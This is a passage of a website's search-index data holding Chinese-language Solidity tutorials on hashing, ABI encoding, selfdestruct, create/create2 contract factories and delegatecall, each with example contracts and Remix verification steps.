","date":"2021-11-14","objectID":"/posts/solidity-hash.html:3:1","tags":["solidity","basic"],"title":"Solidity智能合约中的Hash函数","uri":"/posts/solidity-hash.html"},{"categories":["基础知识","Solidity 进阶"],"content":"生成数据唯一标识 我们可以利用keccak256来生成一些数据的唯一标识。比如我们有几个不同类型的数据：uint，string，address，我们可以先用abi.encodePacked方法将他们打包编码，然后再用keccak256来生成唯一标识： function hash( uint _num, string memory _string, address _addr ) public pure returns (bytes32) { return keccak256(abi.encodePacked(_num, _string, _addr)); } ","date":"2021-11-14","objectID":"/posts/solidity-hash.html:3:2","tags":["solidity","basic"],"title":"Solidity智能合约中的Hash函数","uri":"/posts/solidity-hash.html"},{"categories":["基础知识","Solidity 进阶"],"content":"弱抗碰撞性 我们用keccak256演示一下之前讲到的弱抗碰撞性，即给定一个消息x，找到另一个消息x'使得hash(x) = hash(x')是困难的。 我们给定一个消息0xAA，试图去找另一个消息，使得它们的哈希值相等： // 弱抗碰撞性 function weak( string memory string1 )public view returns (bool){ return keccak256(abi.encodePacked(string1)) == _msg; } 大家可以试个10次，看看能不能幸运的碰撞上。 ","date":"2021-11-14","objectID":"/posts/solidity-hash.html:3:3","tags":["solidity","basic"],"title":"Solidity智能合约中的Hash函数","uri":"/posts/solidity-hash.html"},{"categories":["基础知识","Solidity 进阶"],"content":"强抗碰撞性 我们用keccak256演示一下之前讲到的强抗碰撞性，即找到任意不同的x和x'，使得hash(x) = hash(x')是困难的。 我们构造一个函数strong，接收两个不同的string参数string1和string2，然后判断它们的哈希是否相同： // 强抗碰撞性 function strong( string memory string1, string memory string2 )public pure returns (bool){ return keccak256(abi.encodePacked(string1)) == keccak256(abi.encodePacked(string2)); } 大家可以试个10次，看看能不能幸运的碰撞上。 ","date":"2021-11-14","objectID":"/posts/solidity-hash.html:3:4","tags":["solidity","basic"],"title":"Solidity智能合约中的Hash函数","uri":"/posts/solidity-hash.html"},{"categories":["基础知识","Solidity 进阶"],"content":"在remix上验证 部署合约查看唯一标识的生成结果 验证哈希函数的灵敏性，以及强、弱抗碰撞性 ","date":"2021-11-14","objectID":"/posts/solidity-hash.html:4:0","tags":["solidity","basic"],"title":"Solidity智能合约中的Hash函数","uri":"/posts/solidity-hash.html"},{"categories":["基础知识","Solidity 进阶"],"content":"总结 介绍了什么是哈希函数，以及如何使用solidity最常用的哈希函数keccak256。 ","date":"2021-11-14","objectID":"/posts/solidity-hash.html:5:0","tags":["solidity","basic"],"title":"Solidity智能合约中的Hash函数","uri":"/posts/solidity-hash.html"},{"categories":["基础知识","Solidity 进阶"],"content":" 引言 ABI (Application Binary Interface，应用二进制接口)是与以太坊智能合约交互的标准。数据基于他们的类型编码；并且由于编码后不包含类型信息，解码时需要注明它们的类型。 Solidity中，ABI编码有4个函数：abi.encode, abi.encodePacked, abi.encodeWithSignature, abi.encodeWithSelector。而ABI解码有1个函数：abi.decode，用于解码abi.encode的数据。 ","date":"2021-11-02","objectID":"/posts/solidity-abi.html:0:0","tags":["solidity","basic"],"title":"合约高级用法之ABI编码解码","uri":"/posts/solidity-abi.html"},{"categories":["基础知识","Solidity 进阶"],"content":"ABI编码 我们将编码4个变量，他们的类型分别是uint256（别名 uint）, address, string, uint256[2]： uint x = 10; address addr = 0x7A58c0Be72BE218B41C608b7Fe7C5bB630736C71; string name = \"0xAA\"; uint[2] array = [5, 6]; ","date":"2021-11-02","objectID":"/posts/solidity-abi.html:1:0","tags":["solidity","basic"],"title":"合约高级用法之ABI编码解码","uri":"/posts/solidity-abi.html"},{"categories":["基础知识","Solidity 进阶"],"content":"abi.encode 将给定参数利用ABI规则编码。ABI被设计出来跟智能合约交互，他将每个参数填充为32字节的数据，并拼接在一起。如果你要和合约交互，你要用的就是abi.encode。 function encode() public view returns(bytes memory result) { result = abi.encode(x, addr, name, array); } 编码的结果为0x000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000007a58c0be72be218b41c608b7fe7c5bb630736c7100000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000005000000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000043078414100000000000000000000000000000000000000000000000000000000，由于abi.encode将每个数据都填充为32字节，中间有很多0。 ","date":"2021-11-02","objectID":"/posts/solidity-abi.html:1:1","tags":["solidity","basic"],"title":"合约高级用法之ABI编码解码","uri":"/posts/solidity-abi.html"},{"categories":["基础知识","Solidity 进阶"],"content":"abi.encodePacked 将给定参数根据其所需最低空间编码。它类似 abi.encode，但是会把其中填充的很多0省略。比如，只用1字节来编码uint类型。当你想省空间，并且不与合约交互的时候，可以使用abi.encodePacked，例如算一些数据的hash时。 function encodePacked() public view returns(bytes memory result) { result = abi.encodePacked(x, addr, name, array); } 编码的结果为0x000000000000000000000000000000000000000000000000000000000000000a7a58c0be72be218b41c608b7fe7c5bb630736c713078414100000000000000000000000000000000000000000000000000000000000000050000000000000000000000000000000000000000000000000000000000000006，由于abi.encodePacked对编码进行了压缩，长度比abi.encode短很多。 ","date":"2021-11-02","objectID":"/posts/solidity-abi.html:1:2","tags":["solidity","basic"],"title":"合约高级用法之ABI编码解码","uri":"/posts/solidity-abi.html"},{"categories":["基础知识","Solidity 进阶"],"content":"abi.encodeWithSignature 与abi.encode功能类似，只不过第一个参数为函数签名，比如\"foo(uint256,address,string,uint256[2])\"。当调用其他合约的时候可以使用。 function encodeWithSignature() public view returns(bytes memory result) { result = abi.encodeWithSignature(\"foo(uint256,address,string,uint256[2])\", x, addr, name, array); } 编码的结果为0xe87082f1000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000007a58c0be72be218b41c608b7fe7c5bb630736c7100000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000005000000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000043078414100000000000000000000000000000000000000000000000000000000，等同于在abi.encode编码结果前加上了4字节的函数选择器1。 ","date":"2021-11-02","objectID":"/posts/solidity-abi.html:1:3","tags":["solidity","basic"],"title":"合约高级用法之ABI编码解码","uri":"/posts/solidity-abi.html"},{"categories":["基础知识","Solidity 进阶"],"content":"abi.encodeWithSelector 与abi.encodeWithSignature功能类似，只不过第一个参数为函数选择器，为函数签名Keccak哈希的前4个字节。 function encodeWithSelector() public view returns(bytes memory result) { result = abi.encodeWithSelector(bytes4(keccak256(\"foo(uint256,address,string,uint256[2])\")), x, addr, name, array); } 编码的结果为0xe87082f1000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000007a58c0be72be218b41c608b7fe7c5bb630736c7100000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000005000000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000043078414100000000000000000000000000000000000000000000000000000000，与abi.encodeWithSignature结果一样。 ","date":"2021-11-02","objectID":"/posts/solidity-abi.html:1:4","tags":["solidity","basic"],"title":"合约高级用法之ABI编码解码","uri":"/posts/solidity-abi.html"},{"categories":["基础知识","Solidity 进阶"],"content":"ABI解码 ","date":"2021-11-02","objectID":"/posts/solidity-abi.html:2:0","tags":["solidity","basic"],"title":"合约高级用法之ABI编码解码","uri":"/posts/solidity-abi.html"},{"categories":["基础知识","Solidity 进阶"],"content":"abi.decode abi.decode用于解码abi.encode生成的二进制编码，将它还原成原本的参数。 function decode(bytes memory data) public pure returns(uint dx, address daddr, string memory dname, uint[2] memory darray) { (dx, daddr, dname, darray) = abi.decode(data, (uint, address, string, uint[2])); } 我们将abi.encode的二进制编码输入给decode，将解码出原来的参数： ","date":"2021-11-02","objectID":"/posts/solidity-abi.html:2:1","tags":["solidity","basic"],"title":"合约高级用法之ABI编码解码","uri":"/posts/solidity-abi.html"},{"categories":["基础知识","Solidity 进阶"],"content":"在remix上验证 部署合约查看abi.encode方法的编码结果 对比验证四种编码方法的异同点 查看abi.decode方法的解码结果 ","date":"2021-11-02","objectID":"/posts/solidity-abi.html:3:0","tags":["solidity","basic"],"title":"合约高级用法之ABI编码解码","uri":"/posts/solidity-abi.html"},{"categories":["基础知识","Solidity 进阶"],"content":"ABI的使用场景 在合约开发中，ABI常配合call来实现对合约的底层调用。 bytes4 selector = contract.getValue.selector; bytes memory data = abi.encodeWithSelector(selector, _x); (bool success, bytes memory returnedData) = address(contract).staticcall(data); require(success); return abi.decode(returnedData, (uint256)); ethers.js中常用ABI实现合约的导入和函数调用。 const wavePortalContract = new ethers.Contract(contractAddress, contractABI, signer); /* * Call the getAllWaves method from your Smart Contract */ const waves = await wavePortalContract.getAllWaves(); 对不开源合约进行反编译后，某些函数无法查到函数签名，可通过ABI进行调用。 0x533ba33a() 是一个反编译后显示的函数，只有函数编码后的结果，并且无法查到函数签名 这种情况无法通过构造interface接口或contract来进行调用 这种情况下，就可以通过ABI函数选择器来调用 bytes memory data = abi.encodeWithSelector(bytes4(0x533ba33a)); (bool success, bytes memory returnedData) = address(contract).staticcall(data); require(success); return abi.decode(returnedData, (uint256)); ","date":"2021-11-02","objectID":"/posts/solidity-abi.html:4:0","tags":["solidity","basic"],"title":"合约高级用法之ABI编码解码","uri":"/posts/solidity-abi.html"},{"categories":["基础知识","Solidity 进阶"],"content":"总结 在以太坊中，数据必须编码成字节码才能和智能合约交互。可以使用4种abi编码方法和1种abi解码方法。 函数选择器就是通过函数名和参数进行签名处理(Keccak–Sha3)来标识函数，可以用于不同合约之间的函数调用 ↩︎ ","date":"2021-11-02","objectID":"/posts/solidity-abi.html:5:0","tags":["solidity","basic"],"title":"合约高级用法之ABI编码解码","uri":"/posts/solidity-abi.html"},{"categories":["基础知识","Solidity 进阶"],"content":"selfdestruct selfdestruct命令可以用来删除智能合约，并将该合约剩余ETH转到指定地址。selfdestruct是为了应对合约出错的极端情况而设计的。它最早被命名为suicide（自杀），但是这个词太敏感。为了保护抑郁的程序员，改名为selfdestruct；在 v0.8.18 版本中，selfdestruct 关键字被标记为「不再建议使用」，在一些情况下它会导致预期之外的合约语义，但由于目前还没有代替方案，目前只是对开发者做了编译阶段的警告，相关内容可以查看 EIP-6049。 ","date":"2021-10-15","objectID":"/posts/solidity-delete-contract.html:1:0","tags":["solidity","basic"],"title":"开始自毁跑路！删除合约","uri":"/posts/solidity-delete-contract.html"},{"categories":["基础知识","Solidity 进阶"],"content":"如何使用selfdestruct selfdestruct使用起来非常简单： selfdestruct(_addr)； 其中_addr是接收合约中剩余ETH的地址。 ","date":"2021-10-15","objectID":"/posts/solidity-delete-contract.html:1:1","tags":["solidity","basic"],"title":"开始自毁跑路！删除合约","uri":"/posts/solidity-delete-contract.html"},{"categories":["基础知识","Solidity 进阶"],"content":"例子 contract DeleteContract { uint public value = 10; constructor() payable {} receive() external payable {} function deleteContract() external { // 调用selfdestruct销毁合约，并把剩余的ETH转给msg.sender selfdestruct(payable(msg.sender)); } function getBalance() external view returns(uint balance){ balance = address(this).balance; } } 在DeleteContract合约中，我们写了一个public状态变量value，两个函数：getBalance()用于获取合约ETH余额，deleteContract()用于自毁合约，并把ETH转入给发起人。 部署好合约后，我们向DeleteContract合约转入1 ETH。这时，getBalance()会返回1 ETH，value变量是10。 当我们调用deleteContract()函数，合约将自毁，所有变量都清空，此时value变为默认值0，getBalance()也返回空值。 ","date":"2021-10-15","objectID":"/posts/solidity-delete-contract.html:1:2","tags":["solidity","basic"],"title":"开始自毁跑路！删除合约","uri":"/posts/solidity-delete-contract.html"},{"categories":["基础知识","Solidity 进阶"],"content":"注意事项 对外提供合约销毁接口时，最好设置为只有合约所有者可以调用，可以使用函数修饰符onlyOwner进行函数声明。 当合约被销毁后与智能合约的交互也能成功，并且返回0。 当合约中有selfdestruct功能时常常会带来安全问题和信任问题，合约中的Selfdestruct功能会为攻击者打开攻击向量(例如使用selfdestruct向一个合约频繁转入token进行攻击，这将大大节省了GAS的费用，虽然很少人这么做)，此外，此功能还会降低用户对合约的信心。 ","date":"2021-10-15","objectID":"/posts/solidity-delete-contract.html:1:3","tags":["solidity","basic"],"title":"开始自毁跑路！删除合约","uri":"/posts/solidity-delete-contract.html"},{"categories":["基础知识","Solidity 进阶"],"content":"在remix上验证 部署合约并且转入1ETH，查看合约状态 销毁合约，查看合约状态 从测试中观察合约状态可以发现合约销毁后的ETH返回给了指定的地址，并且在合约销毁后依然可以请求交互，所以我们不能根据这个来判断合约是否已经销毁。 ","date":"2021-10-15","objectID":"/posts/solidity-delete-contract.html:1:4","tags":["solidity","basic"],"title":"开始自毁跑路！删除合约","uri":"/posts/solidity-delete-contract.html"},{"categories":["基础知识","Solidity 进阶"],"content":"总结 selfdestruct是智能合约的紧急按钮，销毁合约并将剩余ETH转移到指定账户。当著名的The DAO攻击发生时，以太坊的创始人们一定后悔过没有在合约里加入selfdestruct来停止黑客的攻击吧。 ","date":"2021-10-15","objectID":"/posts/solidity-delete-contract.html:2:0","tags":["solidity","basic"],"title":"开始自毁跑路！删除合约","uri":"/posts/solidity-delete-contract.html"},{"categories":["基础知识","Solidity 进阶"],"content":" 引言 在以太坊链上，用户（外部账户，EOA）可以创建智能合约，智能合约同样也可以创建新的智能合约。去中心化交易所uniswap就是利用工厂合约（Factory）创建了无数个币对合约（Pair）。这一讲，我会用简化版的uniswap讲如何通过合约创建合约。 有两种方法可以在合约中创建新合约，create和create2。 ","date":"2021-09-17","objectID":"/posts/solidity-new-contract.html:0:0","tags":["solidity","basic"],"title":"如何在合约中创建新合约？","uri":"/posts/solidity-new-contract.html"},{"categories":["基础知识","Solidity 进阶"],"content":"1 create create的用法很简单，就是new一个合约，并传入新合约构造函数所需的参数： Contract x = new Contract{value: _value}(params) 其中Contract是要创建的合约名，x是合约对象（地址），如果构造函数是payable，可以创建时转入_value数量的ETH，params是新合约构造函数的参数。 ","date":"2021-09-17","objectID":"/posts/solidity-new-contract.html:1:0","tags":["solidity","basic"],"title":"如何在合约中创建新合约？","uri":"/posts/solidity-new-contract.html"},{"categories":["基础知识","Solidity 进阶"],"content":"create极简Uniswap Uniswap V2核心合约中包含两个合约： UniswapV2Pair: 币对合约，用于管理币对地址、流动性、买卖。 UniswapV2Factory: 工厂合约，用于创建新的币对，并管理币对地址。 下面我们用create方法实现一个极简版的Uniswap：Pair币对合约负责管理币对地址，PairFactory工厂合约用于创建新的币对，并管理币对地址。 ","date":"2021-09-17","objectID":"/posts/solidity-new-contract.html:2:0","tags":["solidity","basic"],"title":"如何在合约中创建新合约？","uri":"/posts/solidity-new-contract.html"},{"categories":["基础知识","Solidity 进阶"],"content":"Pair合约 contract Pair{ address public factory; // 工厂合约地址 address public token0; // 代币1 address public token1; // 代币2 constructor() payable { factory = msg.sender; } // called once by the factory at time of deployment function initialize(address _token0, address _token1) external { require(msg.sender == factory, 'UniswapV2: FORBIDDEN'); // sufficient check token0 = _token0; token1 = _token1; } } Pair合约很简单，包含3个状态变量：factory，token0和token1。 构造函数constructor在部署时将factory赋值为工厂合约地址。initialize函数会在Pair合约创建的时候被工厂合约调用一次，将token0和token1更新为币对中两种代币的地址。 提问：为什么uniswap不在constructor中将token0和token1地址更新好？ 答：因为uniswap使用的是create2创建合约，限制构造函数不能有参数。当使用create时，Pair合约允许构造函数有参数，可以在constructor中将token0和token1地址更新好。 ","date":"2021-09-17","objectID":"/posts/solidity-new-contract.html:2:1","tags":["solidity","basic"],"title":"如何在合约中创建新合约？","uri":"/posts/solidity-new-contract.html"},{"categories":["基础知识","Solidity 进阶"],"content":"PairFactory contract PairFactory{ mapping(address =\u003e mapping(address =\u003e address)) public getPair; // 通过两个代币地址查Pair地址 address[] public allPairs; // 保存所有Pair地址 function createPair(address tokenA, address tokenB) external returns (address pairAddr) { // 创建新合约 Pair pair = new Pair(); // 调用新合约的initialize方法 pair.initialize(tokenA, tokenB); // 更新地址map pairAddr = address(pair); allPairs.push(pairAddr); getPair[tokenA][tokenB] = pairAddr; getPair[tokenB][tokenA] = pairAddr; } } 工厂合约（PairFactory）有两个状态变量getPair是两个代币地址到币对地址的map，方便根据代币找到币对地址；allPairs是币对地址的数组，存储了所有代币地址。 PairFactory合约只有一个createPair函数，根据输入的两个代币地址tokenA和tokenB来创建新的Pair合约。其中 Pair pair = new Pair(); 就是创建合约的代码，非常简单。大家可以部署好PairFactory合约，然后用下面两个地址作为参数调用createPair，看看创建的币对地址是什么： WBNB地址: 0x2c44b726ADF1963cA47Af88B284C06f30380fC78 BSC链上的PEOPLE地址: 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c ","date":"2021-09-17","objectID":"/posts/solidity-new-contract.html:2:2","tags":["solidity","basic"],"title":"如何在合约中创建新合约？","uri":"/posts/solidity-new-contract.html"},{"categories":["基础知识","Solidity 进阶"],"content":"在remix上验证 1.使用WBNB和PEOPLE的地址作为参数调用createPair,得到Pair合约地址：0xD3e2008b4Da2cD6DEAF73471590fF30C86778A48 2.查看Pair合约变量 3.Debug查看create操作码 ","date":"2021-09-17","objectID":"/posts/solidity-new-contract.html:2:3","tags":["solidity","basic"],"title":"如何在合约中创建新合约？","uri":"/posts/solidity-new-contract.html"},{"categories":["基础知识","Solidity 进阶"],"content":"2 create2 CREATE2 操作码使我们在智能合约部署在以太坊网络之前就能预测合约的地址。Uniswap创建Pair合约用的就是CREATE2而不是CREATE。 ","date":"2021-09-17","objectID":"/posts/solidity-new-contract.html:3:0","tags":["solidity","basic"],"title":"如何在合约中创建新合约？","uri":"/posts/solidity-new-contract.html"},{"categories":["基础知识","Solidity 进阶"],"content":"CREATE如何计算地址 智能合约可以由其他合约和普通账户利用CREATE操作码创建。 在这两种情况下，新合约的地址都以相同的方式计算：创建者的地址(通常为部署的钱包地址或者合约地址)和nonce(该地址发送交易的总数,对于合约账户是创建的合约总数,每创建一个合约nonce+1))的哈希。 新地址 = hash(创建者地址, nonce) 创建者地址不会变，但nonce可能会随时间而改变，因此用CREATE创建的合约地址不好预测。 ","date":"2021-09-17","objectID":"/posts/solidity-new-contract.html:3:1","tags":["solidity","basic"],"title":"如何在合约中创建新合约？","uri":"/posts/solidity-new-contract.html"},{"categories":["基础知识","Solidity 进阶"],"content":"CREATE2如何计算地址 CREATE2的目的是为了让合约地址独立于未来的事件。不管未来区块链上发生了什么，你都可以把合约部署在事先计算好的地址上。用CREATE2创建的合约地址由4个部分决定： 0xFF：一个常数，避免和CREATE冲突 创建者地址 salt（盐）：一个创建者给定的数值 待部署合约的字节码（bytecode） 新地址 = hash(\"0xFF\",创建者地址, salt, bytecode) CREATE2 确保，如果创建者使用 CREATE2 和提供的 salt 部署给定的合约bytecode，它将存储在 新地址 中。 ","date":"2021-09-17","objectID":"/posts/solidity-new-contract.html:3:2","tags":["solidity","basic"],"title":"如何在合约中创建新合约？","uri":"/posts/solidity-new-contract.html"},{"categories":["基础知识","Solidity 进阶"],"content":"如何使用CREATE2 CREATE2的用法和之前讲的Create类似，同样是new一个合约，并传入新合约构造函数所需的参数，只不过要多传一个salt参数： Contract x = new Contract{salt: _salt, value: _value}(params) 其中Contract是要创建的合约名，x是合约对象（地址），_salt是指定的盐；如果构造函数是payable，可以创建时转入_value数量的ETH，params是新合约构造函数的参数。 ","date":"2021-09-17","objectID":"/posts/solidity-new-contract.html:4:0","tags":["solidity","basic"],"title":"如何在合约中创建新合约？","uri":"/posts/solidity-new-contract.html"},{"categories":["基础知识","Solidity 进阶"],"content":"Create2极简Uniswap2 用Create2来实现极简Uniswap。 ","date":"2021-09-17","objectID":"/posts/solidity-new-contract.html:5:0","tags":["solidity","basic"],"title":"如何在合约中创建新合约？","uri":"/posts/solidity-new-contract.html"},{"categories":["基础知识","Solidity 进阶"],"content":"Pair contract Pair{ address public factory; // 工厂合约地址 address public token0; // 代币1 address public token1; // 代币2 constructor() payable { factory = msg.sender; } // called once by the factory at time of deployment function initialize(address _token0, address _token1) external { require(msg.sender == factory, 'UniswapV2: FORBIDDEN'); // sufficient check token0 = _token0; token1 = _token1; } } Pair合约很简单，包含3个状态变量：factory，token0和token1。 构造函数constructor在部署时将factory赋值为工厂合约地址。initialize函数会在Pair合约创建的时候被工厂合约调用一次，将token0和token1更新为币对中两种代币的地址。 ","date":"2021-09-17","objectID":"/posts/solidity-new-contract.html:5:1","tags":["solidity","basic"],"title":"如何在合约中创建新合约？","uri":"/posts/solidity-new-contract.html"},{"categories":["基础知识","Solidity 进阶"],"content":"PairFactory2 contract PairFactory2{ mapping(address =\u003e mapping(address =\u003e address)) public getPair; // 通过两个代币地址查Pair地址 address[] public allPairs; // 保存所有Pair地址 function createPair2(address tokenA, address tokenB) external returns (address pairAddr) { require(tokenA != tokenB, 'IDENTICAL_ADDRESSES'); //避免tokenA和tokenB相同产生的冲突 // 用tokenA和tokenB地址计算salt (address token0, address token1) = tokenA \u003c tokenB ? (tokenA, tokenB) : (tokenB, tokenA); //将tokenA和tokenB按大小排序 bytes32 salt = keccak256(abi.encodePacked(token0, token1)); // 用create2部署新合约 Pair pair = new Pair{salt: salt}(); // 调用新合约的initialize方法 pair.initialize(tokenA, tokenB); // 更新地址map pairAddr = address(pair); allPairs.push(pairAddr); getPair[tokenA][tokenB] = pairAddr; getPair[tokenB][tokenA] = pairAddr; } 工厂合约（PairFactory2）有两个状态变量getPair是两个代币地址到币对地址的map，方便根据代币找到币对地址；allPairs是币对地址的数组，存储了所有币对地址。 PairFactory2合约只有一个createPair2函数，使用CREATE2根据输入的两个代币地址tokenA和tokenB来创建新的Pair合约。其中 Pair pair = new Pair{salt: salt}(); 就是利用CREATE2创建合约的代码，非常简单，而salt为token1和token2的hash： bytes32 salt = keccak256(abi.encodePacked(token0, token1)); ","date":"2021-09-17","objectID":"/posts/solidity-new-contract.html:5:2","tags":["solidity","basic"],"title":"如何在合约中创建新合约？","uri":"/posts/solidity-new-contract.html"},{"categories":["基础知识","Solidity 进阶"],"content":"事先计算Pair地址 // 提前计算pair合约地址 function calculateAddr(address tokenA, address tokenB) public view returns(address predictedAddress){ require(tokenA != tokenB, 'IDENTICAL_ADDRESSES'); //避免tokenA和tokenB相同产生的冲突 // 计算用tokenA和tokenB地址计算salt (address token0, address token1) = tokenA \u003c tokenB ? (tokenA, tokenB) : (tokenB, tokenA); //将tokenA和tokenB按大小排序 bytes32 salt = keccak256(abi.encodePacked(token0, token1)); // 计算合约地址方法 hash() predictedAddress = address(uint160(uint(keccak256(abi.encodePacked( bytes1(0xff), address(this), salt, keccak256(type(Pair).creationCode) ))))); } 我们写了一个calculateAddr函数来事先计算tokenA和tokenB将会生成的Pair地址。通过它，我们可以验证我们事先计算的地址和实际地址是否相同。 大家可以部署好PairFactory2合约，然后用下面两个地址作为参数调用createPair2，看看创建的币对地址是什么，是否与事先计算的地址一样： WBNB地址: 0x2c44b726ADF1963cA47Af88B284C06f30380fC78 BSC链上的PEOPLE地址: 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c 如果部署合约构造函数中存在参数 例如当create2合约时： Pair pair = new Pair{salt: salt}(address(this)); 计算时，需要将参数和bytecode一起进行打包： keccak256(type(Pair).creationCode) =\u003e keccak256(abi.encodePacked(type(Pair).creationCode, abi.encode(address(this)))) predictedAddress = address(uint160(uint(keccak256(abi.encodePacked( bytes1(0xff), address(this), salt, keccak256(abi.encodePacked(type(Pair).creationCode, abi.encode(address(this)))) ))))); ","date":"2021-09-17","objectID":"/posts/solidity-new-contract.html:5:3","tags":["solidity","basic"],"title":"如何在合约中创建新合约？","uri":"/posts/solidity-new-contract.html"},{"categories":["基础知识","Solidity 进阶"],"content":"在remix上验证 首先用WBNB和PEOPLE的地址哈希作为salt来计算出Pair合约的地址 调用PairFactory2.createPair2传入参数为WBNB和PEOPLE的地址，获取出创建的pair合约地址 对比合约地址 ","date":"2021-09-17","objectID":"/posts/solidity-new-contract.html:5:4","tags":["solidity","basic"],"title":"如何在合约中创建新合约？","uri":"/posts/solidity-new-contract.html"},{"categories":["基础知识","Solidity 进阶"],"content":"create2的实际应用场景 交易所为新用户预留创建钱包合约地址。 由 CREATE2 驱动的 factory 合约，在uniswapV2中交易对的创建是在 Factory中调用create2完成。这样做的好处是: 它可以得到一个确定的pair地址, 使得 Router中就可以通过 (tokenA, tokenB) 计算出pair地址, 不再需要执行一次 Factory.getPair(tokenA, tokenB) 的跨合约调用。 ","date":"2021-09-17","objectID":"/posts/solidity-new-contract.html:6:0","tags":["solidity","basic"],"title":"如何在合约中创建新合约？","uri":"/posts/solidity-new-contract.html"},{"categories":["基础知识","Solidity 进阶"],"content":"总结 CREATE2让我们可以在部署合约前确定它的合约地址，这也是一些layer2项目的基础。 ","date":"2021-09-17","objectID":"/posts/solidity-new-contract.html:7:0","tags":["solidity","basic"],"title":"如何在合约中创建新合约？","uri":"/posts/solidity-new-contract.html"},{"categories":["基础知识","Solidity 进阶"],"content":"delegatecall delegatecall与call类似，是solidity中地址类型的低级成员函数。delegate中是委托/代表的意思，那么delegatecall委托了什么？ 当用户A通过合约B来call合约C的时候，执行的是合约C的函数，语境(Context，可以理解为包含变量和状态的环境)也是合约C的：msg.sender是B的地址，并且如果函数改变一些状态变量，产生的效果会作用于合约C的变量上。 而当用户A通过合约B来delegatecall合约C的时候，执行的是合约C的函数，但是语境仍是合约B的：msg.sender是A的地址，并且如果函数改变一些状态变量，产生的效果会作用于合约B的变量上。 大家可以这样理解：一个富商把它的资产（状态变量）都交给一个VC代理（目标合约的函数）来打理。执行的是VC的函数，但是改变的是富商的状态。 delegatecall语法和call类似，也是： 目标合约地址.delegatecall(二进制编码); 其中二进制编码利用结构化编码函数abi.encodeWithSignature获得： abi.encodeWithSignature(\"函数签名\", 逗号分隔的具体参数) 函数签名为\"函数名（逗号分隔的参数类型)\"。例如abi.encodeWithSignature(\"f(uint256,address)\", _x, _addr)。 和call不一样，delegatecall在调用合约时可以指定交易发送的gas，但不能指定发送的ETH数额 注意：delegatecall有安全隐患，使用时要保证当前合约和目标合约的状态变量存储结构相同，并且目标合约安全，不然会造成资产损失。 ","date":"2021-08-29","objectID":"/posts/solidity-delegatecall.html:1:0","tags":["solidity","basic"],"title":"低级成员函数Delegatecall委托调用的用法","uri":"/posts/solidity-delegatecall.html"},{"categories":["基础知识","Solidity 进阶"],"content":"什么情况下会用到delegatecall? 目前delegatecall主要有两个应用场景： 代理合约（Proxy Contract）：将智能合约的存储合约和逻辑合约分开：代理合约（Proxy Contract）存储所有相关的变量，并且保存逻辑合约的地址；所有函数存在逻辑合约（Logic Contract）里，通过delegatecall执行。当升级时，只需要将代理合约指向新的逻辑合约即可。 EIP-2535 Diamonds（钻石）：钻石是一个支持构建可在生产中扩展的模块化智能合约系统的标准。钻石是具有多个实施合同的代理合同。 更多信息请查看：钻石标准简介。 ","date":"2021-08-29","objectID":"/posts/solidity-delegatecall.html:2:0","tags":["solidity","basic"],"title":"低级成员函数Delegatecall委托调用的用法","uri":"/posts/solidity-delegatecall.html"},{"categories":["基础知识","Solidity 进阶"],"content":"delegatecall例子 调用结构：你（A）通过合约B调用目标合约C。 ","date":"2021-08-29","objectID":"/posts/solidity-delegatecall.html:3:0","tags":["solidity","basic"],"title":"低级成员函数Delegatecall委托调用的用法","uri":"/posts/solidity-delegatecall.html"},{"categories":["基础知识","Solidity 进阶"],"content":"被调用的合约C 我们先写一个简单的目标合约C：有两个public变量：num和sender，分别是uint256和address类型；有一个函数，可以将num设定为传入的_num，并且将sender设为msg.sender。 // 被调用的合约C contract C { uint public num; address public sender; function setVars(uint _num) public payable { num = _num; sender = msg.sender; } } ","date":"2021-08-29","objectID":"/posts/solidity-delegatecall.html:3:1","tags":["solidity","basic"],"title":"低级成员函数Delegatecall委托调用的用法","uri":"/posts/solidity-delegatecall.html"},{"categories":["基础知识","Solidity 进阶"],"content":"发起调用的合约B 首先，合约B必须和目标合约C的变量存储布局必须相同，两个变量，并且顺序为num和sender contract B { uint public num; address public sender; 接下来，我们分别用call和delegatecall来调用合约C的setVars函数，更好的理解它们的区别。 callSetVars函数通过call来调用setVars。它有两个参数_addr和_num，分别对应合约C的地址和setVars的参数。 // 通过call来调用C的setVars()函数，将改变合约C里的状态变量 function callSetVars(address _addr, uint _num) external payable{ // call setVars() (bool success, bytes memory data) = _addr.call( abi.encodeWithSignature(\"setVars(uint256)\", _num) ); } 而delegatecallSetVars函数通过delegatecall来调用setVars。与上面的callSetVars函数相同，有两个参数_addr和_num，分别对应合约C的地址和setVars的参数。 // 通过delegatecall来调用C的setVars()函数，将改变合约B里的状态变量 function delegatecallSetVars(address _addr, uint _num) external payable{ // delegatecall setVars() (bool success, bytes memory data) = _addr.delegatecall( abi.encodeWithSignature(\"setVars(uint256)\", _num) ); } } ","date":"2021-08-29","objectID":"/posts/solidity-delegatecall.html:3:2","tags":["solidity","basic"],"title":"低级成员函数Delegatecall委托调用的用法","uri":"/posts/solidity-delegatecall.html"},{"categories":["基础知识","Solidity 进阶"],"content":"在remix上验证 首先，我们把合约B和C都部署好 部署之后，查看C合约状态变量的初始值，B合约的状态变量也是一样。 此时，调用合约B中的callSetVars，传入参数为合约C地址和10 运行后，合约C中的状态变量将被修改：num被改为10，sender变为合约B的地址 接下来，我们调用合约B中的delegatecallSetVars，传入参数为合约C地址和100 由于是delegatecall，语境为合约B。在运行后，合约B中的状态变量将被修改：num被改为100，sender变为你的钱包地址。合约C中的状态变量不会被修改。 ","date":"2021-08-29","objectID":"/posts/solidity-delegatecall.html:3:3","tags":["solidity","basic"],"title":"低级成员函数Delegatecall委托调用的用法","uri":"/posts/solidity-delegatecall.html"},{"categories":["基础知识","Solidity 进阶"],"content":"总结 介绍了solidity中的另一个低级函数delegatecall。与call类似，它可以用来调用其他合约；不同点在于运行的语境，B call C，语境为C；而B delegatecall C，语境为B。目前delegatecall最大的应用是代理合约和EIP-2535 Diamonds（钻石）。 